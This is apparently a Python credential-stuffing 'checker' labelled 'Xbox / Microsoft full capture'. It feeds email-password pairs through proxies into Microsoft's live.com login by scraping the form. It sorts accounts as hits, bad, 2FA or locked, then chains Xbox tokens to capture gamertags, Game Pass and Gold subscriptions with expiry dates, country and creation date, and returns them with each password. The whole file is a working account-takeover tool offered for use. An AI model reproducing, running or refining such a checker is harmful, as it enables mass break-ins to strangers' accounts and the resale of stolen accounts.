"""
╔══════════════════════════════════════════╗
║   XBOX / MICROSOFT FULL CAPTURE         ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
Microsoft OAuth2 → XBL → XSTS → Profile + Subscriptions + Account Meta
"""
import re
import requests
from dataclasses import dataclass

MS_LOGIN_URL  = "https://login.live.com/oauth20_authorize.srf"
MS_TOKEN_URL  = "https://login.live.com/oauth20_token.srf"
XBOX_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
XBOX_XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
XBOX_PROFILE  = "https://profile.xboxlive.com/users/me/profile/settings"
XBOX_SUBS     = "https://licensing.mp.microsoft.com/v8.0/licenses/query"
MS_ACCT_INFO  = "https://account.live.com/acct/GetAccountInfo"
CLIENT_ID     = "000000004C12AE6F"

HEADERS_BASE = {
    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Content-Type": "application/x-www-form-urlencoded",
}


class Status:
    HIT    = "HIT"
    BAD    = "BAD"
    TWO_FA = "2FA"
    LOCKED = "LOCKED"
    RATE   = "RATELIMIT"
    ERROR  = "ERROR"
    NO_XBOX = "NO_XBOX"


def _session(proxy: str = None) -> requests.Session:
    s = requests.Session()
    s.headers.update(HEADERS_BASE)
    if proxy:
        p = proxy if proxy.startswith("http") else f"http://{proxy}"
        s.proxies = {"http": p, "https": p}
    s.timeout = 15
    return s


def ms_login(email: str, password: str, proxy: str = None) -> dict:
    s = _session(proxy)
    try:
        # Step 1: get PPFT + login URL
        r = s.get(
            MS_LOGIN_URL,
            params={
                "client_id": CLIENT_ID,
                "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
                "response_type": "code",
                "scope": "service::user.auth.xboxlive.com::MBI_SSL",
            }
        )
        ppft = re.search(r'sFTTag:\'.*?value="(.+?)"', r.text)
        post_url = re.search(r"urlPost:'(.+?)'", r.text)
        if not ppft or not post_url:
            return {"status": Status.ERROR, "detail": "parse_failed"}

        # Step 2: POST credentials
        r2 = s.post(post_url.group(1), data={
            "login":    email,
            "passwd":   password,
            "PPFT":     ppft.group(1),
            "PPSX":     "Passpor",
            "SI":       "Sign in",
            "type":     "11",
            "NewUser":  "1",
            "LoginOptions": "1",
        })

        # check error codes
        if "sErrorCode" in r2.text:
            ec = re.search(r"sErrorCode: '(\d+)'", r2.text)
            code = ec.group(1) if ec else "0"
            # 50126 = wrong pass, 50053 = locked, 50076/79 = 2FA
            if code in ("50126", "50128", "50034"):
                return {"status": Status.BAD}
            if code in ("50053", "50057", "50055"):
                return {"status": Status.LOCKED}
            if code in ("50076", "50079", "50074"):
                return {"status": Status.TWO_FA}
            return {"status": Status.ERROR, "detail": f"aadsts_{code}"}

        if "access_token" in r2.url or "code=" in r2.url:
            # extract code
            code_match = re.search(r"[?&]code=([^&]+)", r2.url)
            if code_match:
                return {"status": "CODE", "code": code_match.group(1), "session": s}
            # sometimes token is inline
            tok = re.search(r"access_token=([^&]+)", r2.url)
            if tok:
                return {"status": "TOKEN", "access_token": tok.group(1), "session": s}

        # 2FA pages
        if any(x in r2.text for x in ["tfa", "proofs", "otc", "authenticator", "verify"]):
            return {"status": Status.TWO_FA}

        if "accountcompromised" in r2.url or "ifexists" in r2.text:
            return {"status": Status.LOCKED}

        return {"status": Status.ERROR, "detail": "unknown_response"}

    except requests.exceptions.ProxyError:
        return {"status": Status.ERROR, "detail": "proxy_error"}
    except requests.exceptions.Timeout:
        return {"status": Status.RATE, "detail": "timeout"}
    except Exception as e:
        return {"status": Status.ERROR, "detail": str(e)[:80]}


def _exchange_code(code: str, s: requests.Session) -> str | None:
    """Exchange auth code for access token."""
    try:
        r = s.post(MS_TOKEN_URL, data={
            "client_id":    CLIENT_ID,
            "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
            "grant_type":   "authorization_code",
            "code":         code,
        })
        return r.json().get("access_token")
    except Exception:
        return None


def get_xbox_user_token(access_token: str, proxy: str = None) -> dict:
    s = _session(proxy)
    try:
        r = s.post(XBOX_AUTH_URL, json={
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName":   "user.auth.xboxlive.com",
                "RpsTicket":  f"d={access_token}",
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
        }, headers={"Content-Type": "application/json", "Accept": "application/json"})
        d = r.json()
        return {
            "token": d.get("Token", ""),
            "uhs":   d.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", ""),
        }
    except Exception as e:
        return {"token": "", "uhs": "", "error": str(e)}


def get_xsts_token(user_token: str, proxy: str = None) -> dict:
    s = _session(proxy)
    try:
        r = s.post(XBOX_XSTS_URL, json={
            "Properties": {
                "SandboxId":  "RETAIL",
                "UserTokens": [user_token],
            },
            "RelyingParty": "http://xboxlive.com",
            "TokenType": "JWT",
        }, headers={"Content-Type": "application/json", "Accept": "application/json"})
        d = r.json()
        xerr = d.get("XErr", 0)
        if xerr == 2148916233:
            return {"status": Status.NO_XBOX}
        if xerr == 2148916238:
            return {"status": Status.LOCKED, "detail": "child_account"}
        return {
            "status": "ok",
            "token": d.get("Token", ""),
            "uhs":   d.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", ""),
        }
    except Exception as e:
        return {"status": Status.ERROR, "detail": str(e)}


def get_xbox_profile(xsts_token: str, uhs: str, proxy: str = None) -> dict:
    s = _session(proxy)
    try:
        r = s.get(
            XBOX_PROFILE,
            params={"settings": "Gamertag,Gamerscore,AccountTier,XboxOneRep,PreferredColor"},
            headers={
                "Authorization":   f"XBL3.0 x={uhs};{xsts_token}",
                "x-xbl-contract-version": "2",
                "Accept": "application/json",
            }
        )
        settings = {s["id"]: s["value"] for s in r.json().get("profileUsers", [{}])[0].get("settings", [])}
        xuid = r.json().get("profileUsers", [{}])[0].get("id", "")
        return {
            "gamertag":    settings.get("Gamertag", ""),
            "gamerscore":  settings.get("Gamerscore", "0"),
            "tier":        settings.get("AccountTier", ""),
            "xuid":        xuid,
        }
    except Exception:
        return {"gamertag": "", "gamerscore": "0", "tier": "", "xuid": ""}


def get_subscriptions(access_token: str, proxy: str = None) -> dict:
    """Check Game Pass Ultimate, PC Game Pass, Gold."""
    s = _session(proxy)
    result = {
        "game_pass_ultimate": False,
        "game_pass_pc":       False,
        "xbox_live_gold":     False,
        "ultimate_expiry":    "",
        "gold_expiry":        "",
        "pc_expiry":          "",
    }
    try:
        r = s.get(
            "https://licensing.xboxlive.com/v8.0/users/me/bundles",
            headers={
                "Authorization": f"XBL3.0 x=;{access_token}",
                "x-xbl-contract-version": "8",
                "Accept": "application/json",
            }
        )
        for item in r.json().get("items", []):
            pid  = item.get("productId", "").lower()
            exp  = item.get("endDate", "")[:10] if item.get("endDate") else ""
            active = item.get("subscriptionState", "") == "Active"
            if not active:
                continue
            # GPU = 9MZ0X3WKWKK7 / CFQ7TTC0KGQ8 / various
            if any(x in pid for x in ["cfq7ttc0khs0", "cfq7ttc0kgq8", "9mz0x3wkwkk7",
                                       "cfq7ttc0k5dj", "gamepassultimate"]):
                result["game_pass_ultimate"] = True
                result["ultimate_expiry"] = exp
            elif any(x in pid for x in ["cfq7ttc0kgq9", "gamepasspc", "pcgamepass"]):
                result["game_pass_pc"] = True
                result["pc_expiry"] = exp
            elif any(x in pid for x in ["cfq7ttc0khrd", "xboxlivegold", "xboxgold", "gold"]):
                result["xbox_live_gold"] = True
                result["gold_expiry"] = exp
    except Exception:
        pass

    # fallback: try MembershipAssociations
    if not any([result["game_pass_ultimate"], result["game_pass_pc"], result["xbox_live_gold"]]):
        try:
            r2 = s.get(
                "https://userpresence.xboxlive.com/users/me/devices",
                headers={"Authorization": f"XBL3.0 x=;{access_token}", "Accept": "application/json"}
            )
        except Exception:
            pass

    return result


def get_account_meta(access_token: str, proxy: str = None) -> dict:
    """Get country, creation date from MS account."""
    s = _session(proxy)
    try:
        r = s.get(
            "https://account.live.com/acct/GetAccountInfo",
            headers={"Authorization": f"Bearer {access_token}", "Accept": "application/json"},
        )
        d = r.json()
        return {
            "country":      d.get("country", ""),
            "created_date": d.get("accountCreationDate", "")[:10],
        }
    except Exception:
        return {"country": "", "created_date": ""}


def check_xbox(email: str, password: str, proxy: str = None) -> dict:
    """Full Xbox/Microsoft capture pipeline."""
    base = {"email": email, "password": password, "checker": "xbox"}

    login = ms_login(email, password, proxy)
    st    = login.get("status")

    if st == Status.BAD:    return {**base, "status": Status.BAD}
    if st == Status.TWO_FA: return {**base, "status": Status.TWO_FA}
    if st == Status.LOCKED: return {**base, "status": Status.LOCKED}
    if st == Status.RATE:   return {**base, "status": Status.RATE}
    if st not in ("CODE", "TOKEN"):
        return {**base, "status": st or Status.ERROR}

    # get access token
    sess         = login.get("session")
    access_token = login.get("access_token") or _exchange_code(login.get("code", ""), sess)
    if not access_token:
        return {**base, "status": Status.ERROR, "detail": "no_access_token"}

    # Xbox auth chain
    xbl   = get_xbox_user_token(access_token, proxy)
    if not xbl.get("token"):
        return {**base, "status": Status.NO_XBOX, "access_token": access_token}

    xsts  = get_xsts_token(xbl["token"], proxy)
    if xsts.get("status") != "ok":
        # still a valid MS account, just no Xbox
        meta  = get_account_meta(access_token, proxy)
        return {
            **base,
            "status":   Status.NO_XBOX,
            "country":  meta.get("country", ""),
            "created":  meta.get("created_date", ""),
        }

    profile = get_xbox_profile(xsts["token"], xsts["uhs"], proxy)
    subs    = get_subscriptions(access_token, proxy)
    meta    = get_account_meta(access_token, proxy)

    return {
        **base,
        "status":             Status.HIT,
        "gamertag":           profile.get("gamertag", ""),
        "gamerscore":         profile.get("gamerscore", "0"),
        "tier":               profile.get("tier", ""),
        "xuid":               profile.get("xuid", ""),
        "game_pass_ultimate": subs["game_pass_ultimate"],
        "game_pass_pc":       subs["game_pass_pc"],
        "xbox_live_gold":     subs["xbox_live_gold"],
        "ultimate_expiry":    subs["ultimate_expiry"],
        "gold_expiry":        subs["gold_expiry"],
        "pc_expiry":          subs["pc_expiry"],
        "country":            meta.get("country", ""),
        "created":            meta.get("created_date", ""),
    }
